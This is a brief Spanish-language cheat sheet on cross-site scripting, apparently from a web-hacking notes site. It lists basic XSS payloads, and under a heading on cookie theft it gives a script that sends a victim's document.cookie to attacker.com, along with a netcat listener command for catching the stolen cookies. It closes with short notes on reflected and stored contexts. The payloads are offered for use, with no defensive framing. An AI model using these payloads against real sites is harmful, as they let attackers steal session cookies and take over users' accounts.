---
title: "Cross Site Scripting (XSS)"
layout: "single"
category: "Web Hacking"
slug: "web-hacking/xss"
date: "2025-11-26"
---

### Payloads Básicos
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
```

### Robo de Cookies (Blind XSS)
```html
<script>document.location='http://attacker.com/cookie?c='+document.cookie</script>
```
Recibe en tu máquina: `nc -nlvp 80`

### Contextos
* **Reflejado:** En parámetros URL o búsquedas.
* **Almacenado:** En comentarios o perfiles.
